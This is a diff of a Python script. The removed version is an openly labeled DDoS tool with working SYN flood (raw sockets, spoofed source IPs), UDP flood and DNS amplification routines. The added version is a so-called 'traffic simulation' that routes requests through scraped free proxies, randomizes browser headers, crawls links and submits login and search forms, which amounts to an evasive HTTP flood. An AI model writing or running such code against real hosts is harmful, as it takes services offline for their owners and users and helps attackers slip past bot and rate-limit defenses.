@@ -1,237 +1,267 @@
+import aiohttp
 import asyncio
-import argparse
-import logging
 import random
+import logging
+import sys
+import argparse
 import time
-import os
-import socket
-import struct
-import threading
-from concurrent.futures import ThreadPoolExecutor
-import signal
+import json
+from fake_useragent import UserAgent
+from colorama import init, Fore, Style
+from rich.console import Console
+from rich.live import Live
+from rich.table import Table
+from rich.layout import Layout
+from bs4 import BeautifulSoup
+import urllib.parse
+from queue import Queue
+import sqlite3
+from aiohttp_socks import ProxyConnector
 
-# Configure logging
+# Initialize tools
+init()  # Colorama
+console = Console()
 logging.basicConfig(
-    filename='ddos_attack.log',
+    filename='advanced_traffic_simulation.log',
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s'
 )
 
-# Default configuration
-DEFAULT_CONFIG = {
-    "target_host": "yourwebsite.com",  # Replace with your domain/IP
-    "target_port": 80,
-    "workers": 50,  # High concurrency
-    "rate": 1000,  # Packets/requests per second per worker
-    "duration": 60,
-    "attack_type": "syn",  # syn, udp, amplify
-    "payload_size": 1024,
-    "spoof_ips": True,
-    "dns_server": "8.8.8.8"  # For amplification
-}
+# Configuration
+DEFAULT_TARGET = "http://localhost:8000"
+DEFAULT_CONCURRENCY = 10
+DEFAULT_DELAY = 0.5
+DEFAULT_TIMEOUT = 5
+DEFAULT_MAX_REQUESTS = 50
 
-# Stats tracking
-stats = {
-    "packets": 0, "errors": 0, "start_time": time.time(), "bytes_sent": 0
-}
+# Global state
+request_counter = 0
+success_counter = 0
+error_counter = 0
+active_tasks = 0
+lock = asyncio.Lock()
+ua = UserAgent()
+page_queue = Queue()
+stats = {'rate': 0, 'last_update': time.time()}
+proxy_list = []
 
-class DDoSAttacker:
-    """Near-real DDoS attack tool for educational testing."""
-    def __init__(self, config: Dict):
-        self.target_host = config["target_host"]
-        self.target_port = config["target_port"]
-        self.workers = config["workers"]
-        self.rate = config["rate"]
-        self.duration = config["duration"]
-        self.attack_type = config["attack_type"].lower()
-        self.payload_size = config["payload_size"]
-        self.spoof_ips = config["spoof_ips"]
-        self.dns_server = config["dns_server"]
-        self.running = True
-        self.lock = threading.Lock()
-        signal.signal(signal.SIGINT, self._handle_stop)
+# SQLite setup for analytics
+conn = sqlite3.connect('traffic_stats.db')
+conn.execute('''CREATE TABLE IF NOT EXISTS requests (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    timestamp TEXT,
+    url TEXT,
+    status INTEGER,
+    thread_id INTEGER,
+    proxy TEXT
+)''')
+conn.commit()
 
-    def _handle_stop(self, signum, frame):
-        """Graceful shutdown with summary."""
-        self.running = False
-        elapsed = time.time() - stats["start_time"]
-        pkt_per_sec = stats["packets"] / elapsed if elapsed > 0 else 0
-        bandwidth_used = stats["bytes_sent"] / elapsed if elapsed > 0 else 0
-        logging.info(f"Attack stopped. Packets: {stats['packets']}, Errors: {stats['errors']}, Time: {elapsed:.2f}s, Pkt/s: {pkt_per_sec:.2f}, Bandwidth: {bandwidth_used:.2f} B/s")
-        print(f"\nAttack stopped.")
-        print(f"Packets: {stats['packets']} | Errors: {stats['errors']}")
-        print(f"Elapsed: {elapsed:.2f}s | Rate: {pkt_per_sec:.2f} pkt/s")
-        print(f"Bandwidth Used: {bandwidth_used:.2f} B/s")
-        print("Details in 'ddos_attack.log'.")
-        self._export_report(elapsed, pkt_per_sec, bandwidth_used)
+async def fetch_proxies():
+    """Fetch free proxies from an API."""
+    global proxy_list
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http") as resp:
+                proxies = await resp.text()
+                proxy_list = [{'http': f"http://{p}"} for p in proxies.splitlines() if p]
+        console.print(f"[yellow]Fetched {len(proxy_list)} proxies[/yellow]")
+    except Exception as e:
+        logging.error(f"Proxy fetch failed: {str(e)}")
+        proxy_list = []
 
-    def _random_ip(self) -> str:
-        """Generate a random IP for spoofing simulation."""
-        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
+def get_random_headers(referer=None):
+    """Generate realistic browser headers."""
+    return {
+        'User-Agent': ua.random,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'Accept-Language': random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9']),
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Referer': referer or random.choice(['https://google.com', 'https://bing.com', None]),
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Cache-Control': 'max-age=0',
+        'DNT': '1',
+    }
 
-    def _create_syn_packet(self, src_ip: str, src_port: int) -> bytes:
-        """Craft a raw SYN packet."""
-        ip_header = struct.pack('!BBHHHBBH4s4s',
-            0x45, 0, 20 + 20, random.randint(0, 65535), 0, 64, 6, 0,  # IP header
-            socket.inet_aton(src_ip), socket.inet_aton(self.target_host))
-        tcp_header = struct.pack('!HHLLBBHHH',
-            src_port, self.target_port, 0, 0, 5 << 4, 2, 1024, 0, 0)  # SYN flag
-        return ip_header + tcp_header
+async def discover_pages(base_url, session):
+    """Dynamically discover pages and forms."""
+    try:
+        async with session.get(base_url, headers=get_random_headers()) as response:
+            text = await response.text()
+            soup = BeautifulSoup(text, 'html.parser')
+            links = [urllib.parse.urljoin(base_url, a.get('href')) 
+                     for a in soup.find_all('a', href=True) 
+                     if urllib.parse.urljoin(base_url, a.get('href')).startswith(base_url)]
+            forms = [urllib.parse.urljoin(base_url, form.get('action')) 
+                     for form in soup.find_all('form') if form.get('action')]
+            return list(set(links + forms)) if links or forms else [base_url]
+    except Exception as e:
+        logging.error(f"Page discovery failed: {str(e)}")
+        return [base_url]
 
-    def _create_dns_query(self) -> bytes:
-        """Craft a DNS query for amplification simulation."""
-        dns_id = random.randint(0, 65535)
-        dns_header = struct.pack('!HHHHHH', dns_id, 0x0100, 1, 0, 0, 0)
-        qname = b''.join(bytes([len(part)]) + part.encode() for part in self.target_host.split('.')) + b'\x00'
-        question = qname + struct.pack('!HH', 1, 1)  # A record, IN class
-        return dns_header + question
+async def simulate_user(thread_id, base_url, pages, args, semaphore):
+    """Simulate a complex user journey asynchronously."""
+    global request_counter, success_counter, error_counter, active_tasks
+    sent_requests = 0
+    async with semaphore:
+        async with lock:
+            active_tasks += 1
+        
+        # Proxy setup
+        proxy = random.choice(proxy_list) if proxy_list else None
+        connector = ProxyConnector.from_url(proxy['http']) if proxy else None
+        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=args.timeout)) as session:
+            user_state = {'logged_in': False, 'visited': []}  # Track user state
+            
+            while sent_requests < args.max_requests:
+                target_url = (random.choice(pages) if random.random() > 0.3 
+                              else page_queue.get() if not page_queue.empty() else base_url)
+                headers = get_random_headers(referer=user_state['visited'][-1] if user_state['visited'] else None)
+                
+                try:
+                    # Behavioral simulation
+                    if 'login' in target_url.lower() and not user_state['logged_in'] and random.random() < 0.3:
+                        data = {'username': 'test', 'password': 'pass123'}
+                        async with session.post(target_url, headers=headers, data=data) as response:
+                            user_state['logged_in'] = response.status == 200
+                    elif 'search' in target_url.lower() and random.random() < 0.2:
+                        data = {'query': random.choice(['test', 'product', 'info'])}
+                        async with session.post(target_url, headers=headers, data=data) as response:
+                            pass
+                    else:
+                        async with session.get(target_url, headers=headers) as response:
+                            pass
 
-    def _syn_flood(self, worker_id: int):
-        """Raw SYN flood attack."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-        while self.running:
-            try:
-                src_ip = self._random_ip() if self.spoof_ips else "127.0.0.1"
-                src_port = random.randint(1024, 65535)
-                packet = self._create_syn_packet(src_ip, src_port)
-                sock.sendto(packet, (self.target_host, self.target_port))
-                with self.lock:
-                    stats["packets"] += 1
-                    stats["bytes_sent"] += len(packet)
-                time.sleep(1 / self.rate)
-            except Exception as e:
-                with self.lock:
-                    stats["errors"] += 1
-                logging.error(f"Worker {worker_id} (SYN) failed: {str(e)}")
-        sock.close()
+                    status = response.status
+                    async with lock:
+                        request_counter += 1
+                        success_counter += 1 if status == 200 else 0
+                        error_counter += 1 if status != 200 else 0
+                        now = time.time()
+                        stats['rate'] = (request_counter / (now - stats['last_update'])) * 60
+                        stats['last_update'] = now
+                    
+                    log_msg = f"Thread {thread_id} | {response.method} {target_url} | Status: {status}"
+                    console.print(f"{Fore.GREEN if status == 200 else Fore.RED}[{'SUCCESS' if status == 200 else 'ERROR'}]{Style.RESET_ALL} {log_msg}")
+                    logging.info(log_msg)
+                    conn.execute("INSERT INTO requests (timestamp, url, status, thread_id, proxy) VALUES (?, ?, ?, ?, ?)",
+                                 (time.strftime('%Y-%m-%d %H:%M:%S'), target_url, status, thread_id, str(proxy)))
+                    conn.commit()
 
-    def _udp_flood(self, worker_id: int):
-        """Raw UDP flood attack."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        payload = os.urandom(self.payload_size)
-        while self.running:
-            try:
-                sock.sendto(payload, (self.target_host, self.target_port))
-                with self.lock:
-                    stats["packets"] += 1
-                    stats["bytes_sent"] += len(payload)
-                time.sleep(1 / self.rate)
-            except Exception as e:
-                with self.lock:
-                    stats["errors"] += 1
-                logging.error(f"Worker {worker_id} (UDP) failed: {str(e)}")
-        sock.close()
+                    user_state['visited'].append(target_url)
+                    if random.random() < 0.2:
+                        new_pages = await discover_pages(target_url, session)
+                        for page in new_pages:
+                            page_queue.put(page)
+                    
+                    # Simulate sub-resource or time on page
+                    if random.random() < 0.5:
+                        sub_url = f"{target_url.rstrip('/')}/static/{random.randint(1, 100)}.js"
+                        async with session.get(sub_url, headers=headers) as _:
+                            pass
+                    await asyncio.sleep(random.uniform(1, 6))
 
-    def _amplify_flood(self, worker_id: int):
-        """DNS amplification simulation."""
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        dns_query = self._create_dns_query()
-        while self.running:
-            try:
-                sock.sendto(dns_query, (self.dns_server, 53))
-                amplified_size = len(dns_query) * 10  # Simulated amplification factor
-                with self.lock:
-                    stats["packets"] += 1
-                    stats["bytes_sent"] += amplified_size
-                time.sleep(1 / self.rate)
-            except Exception as e:
-                with self.lock:
-                    stats["errors"] += 1
-                logging.error(f"Worker {worker_id} (Amplify) failed: {str(e)}")
-        sock.close()
+                except Exception as e:
+                    async with lock:
+                        request_counter += 1
+                        error_counter += 1
+                    log_msg = f"Thread {thread_id} | Failed {target_url}: {str(e)}"
+                    console.print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {log_msg}")
+                    logging.error(log_msg)
 
-    def _worker(self, worker_id: int):
-        """Worker thread for attack type."""
-        attack_func = {
-            "syn": self._syn_flood,
-            "udp": self._udp_flood,
-            "amplify": self._amplify_flood
-        }.get(self.attack_type, self._udp_flood)
-        attack_func(worker_id)
+                sent_requests += 1
+                await asyncio.sleep(args.delay * random.uniform(0.5, 1.5))
+        
+        async with lock:
+            active_tasks -= 1
 
-    def _export_report(self, elapsed: float, pkt_per_sec: float, bandwidth_used: float):
-        """Export report to CSV."""
-        with open('report.csv', 'w', newline='') as f:
-            writer = csv.writer(f)
-            writer.writerow(["Metric", "Value"])
-            writer.writerow(["Total Packets", stats["packets"]])
-            writer.writerow(["Errors", stats["errors"]])
-            writer.writerow(["Elapsed Time (s)", f"{elapsed:.2f}"])
-            writer.writerow(["Packet Rate (pkt/s)", f"{pkt_per_sec:.2f}"])
-            writer.writerow(["Bandwidth Used (B/s)", f"{bandwidth_used:.2f}"])
+def create_dashboard():
+    """Create an interactive dashboard layout."""
+    layout = Layout()
+    layout.split_column(
+        Layout(name="header", size=3),
+        Layout(name="stats", size=12),
+        Layout(name="controls", size=5)
+    )
+    return layout
 
-    def run(self):
-        """Run the DDoS attack."""
-        logging.info(f"Starting {self.attack_type.upper()} attack on {self.target_host}:{self.target_port} with {self.workers} workers")
-        print(f"Starting {self.attack_type.upper()} DDoS Attack")
-        print(f"Target: {self.target_host}:{self.target_port} | Workers: {self.workers} | Rate: {self.rate} pkt/s/worker")
-        print(f"Duration: {self.duration or 'Indefinite'}")
-        if self.attack_type in ['udp', 'syn', 'amplify']:
-            print(f"Payload Size: {self.payload_size} bytes")
-        if self.spoof_ips:
-            print("IP Spoofing Simulation: Enabled")
-        print("Press Ctrl+C to stop.")
+def update_dashboard(layout, live):
+    """Update the real-time dashboard."""
+    with lock:
+        layout["header"].update(
+            Table.grid(expand=True).add_row(
+                f"[yellow]Advanced Traffic Simulation - Target: {args.target}[/yellow]",
+                f"[yellow]Tasks: {active_tasks}/{args.concurrency}[/yellow]",
+                f"[yellow]Press Ctrl+C to stop[/yellow]"
+            )
+        )
+        
+        stats_table = Table(title="Real-Time Stats", expand=True)
+        stats_table.add_column("Metric", justify="left")
+        stats_table.add_column("Value", justify="right")
+        stats_table.add_row("Total Requests", str(request_counter))
+        stats_table.add_row("Successes", str(success_counter))
+        stats_table.add_row("Errors", str(error_counter))
+        stats_table.add_row("Req/Min", f"{stats['rate']:.2f}")
+        stats_table.add_row("Queue Size", str(page_queue.qsize()))
+        stats_table.add_row("Proxies", str(len(proxy_list)))
+        layout["stats"].update(stats_table)
+        
+        controls_table = Table(title="Controls", expand=True)
+        controls_table.add_column("Action", justify="left")
+        controls_table.add_row("[Not Implemented] Pause/Resume: P")
+        controls_table.add_row("[Not Implemented] Adjust Rate: +/-")
+        layout["controls"].update(controls_table)
 
-        threads = []
-        for i in range(self.workers):
-            t = threading.Thread(target=self._worker, args=(i,))
-            t.daemon = True
-            threads.append(t)
-            t.start()
+async def start_simulation(args):
+    """Start the advanced simulation."""
+    console.print(f"[yellow]Starting advanced traffic simulation...[/yellow]")
+    logging.info(f"Simulation started on {args.target} with {args.concurrency} tasks")
 
-        try:
-            if self.duration:
-                time.sleep(self.duration)
-            else:
-                while self.running:
-                    time.sleep(1)
-        except KeyboardInterrupt:
-            pass
-        self.running = False
-        for t in threads:
-            t.join()
+    # Fetch proxies
+    await fetch_proxies()
+    
+    # Initial page discovery
+    async with aiohttp.ClientSession() as session:
+        pages = await discover_pages(args.target, session)
+    for page in pages:
+        page_queue.put(page)
+    console.print(f"[yellow]Initial pages: {pages}[/yellow]")
 
-def load_config(file_path: str = "config.json") -> Dict:
-    """Load configuration from JSON."""
-    if os.path.exists(file_path):
-        with open(file_path, 'r') as f:
-            return json.load(f)
-    return DEFAULT_CONFIG
+    # Setup dashboard
+    layout = create_dashboard()
+    semaphore = asyncio.Semaphore(args.concurrency)
+    
+    async with Live(layout, refresh_per_second=4, console=console) as live:
+        tasks = [asyncio.create_task(simulate_user(i, args.target, pages, args, semaphore)) 
+                 for i in range(args.concurrency)]
+        
+        while active_tasks > 0 or any(not t.done() for t in tasks):
+            update_dashboard(layout, live)
+            await asyncio.sleep(0.25)
+        
+        await asyncio.gather(*tasks, return_exceptions=True)
+
+    logging.info("Simulation completed")
+    conn.close()
 
 def parse_args():
     """Parse command-line arguments."""
-    parser = argparse.ArgumentParser(description="Near-Real DDoS Attack Tool")
-    parser.add_argument('--config', default="config.json", help="Path to config JSON")
-    parser.add_argument('--host', help="Target host (domain or IP)")
-    parser.add_argument('--port', type=int, help="Target port")
-    parser.add_argument('--workers', type=int, help="Number of workers")
-    parser.add_argument('--rate', type=float, help="Packets per second per worker")
-    parser.add_argument('--duration', type=float, help="Duration in seconds")
-    parser.add_argument('--type', choices=['syn', 'udp', 'amplify'], help="Attack type")
-    parser.add_argument('--payload', type=int, help="Payload size in bytes")
-    parser.add_argument('--spoof-ips', action='store_true', help="Simulate IP spoofing")
-    parser.add_argument('--dns-server', help="DNS server for amplification")
-    args = parser.parse_args()
-
-    config = load_config(args.config)
-    if args.host: config["target_host"] = args.host
-    if args.port: config["target_port"] = args.port
-    if args.workers: config["workers"] = args.workers
-    if args.rate: config["rate"] = args.rate
-    if args.duration is not None: config["duration"] = args.duration
-    if args.type: config["attack_type"] = args.type
-    if args.payload: config["payload_size"] = args.payload
-    if args.spoof_ips: config["spoof_ips"] = True
-    if args.dns_server: config["dns_server"] = args.dns_server
-    return config
+    parser = argparse.ArgumentParser(description="Advanced Async Traffic Simulation")
+    parser.add_argument('--target', default=DEFAULT_TARGET, help="Target URL")
+    parser.add_argument('--concurrency', type=int, default=DEFAULT_CONCURRENCY, help="Concurrent tasks")
+    parser.add_argument('--delay', type=float, default=DEFAULT_DELAY, help="Base delay (seconds)")
+    parser.add_argument('--timeout', type=int, default=DEFAULT_TIMEOUT, help="Request timeout (seconds)")
+    parser.add_argument('--max-requests', type=int, default=DEFAULT_MAX_REQUESTS, help="Max requests per task")
+    return parser.parse_args()
 
 if __name__ == "__main__":
-    config = parse_args()
-    attacker = DDoSAttacker(config)
+    args = parse_args()
     try:
-        attacker.run()
-    except PermissionError:
-        print("Error: This tool requires root privileges for raw socket access (e.g., 'sudo python ddos_tool_real.py').")
-    except Exception as e:
-        print(f"Error: {str(e)}")
+        asyncio.run(start_simulation(args))
+    except KeyboardInterrupt:
+        console.print(f"\n[yellow]Simulation stopped by user[/yellow]")
+        logging.info("Simulation stopped by user")
+        console.print(f"Final Stats - Requests: {request_counter}, Success: {success_counter}, Errors: {error_counter}")
+        console.print("Check 'advanced_traffic_simulation.log' and 'traffic_stats.db' for details.")
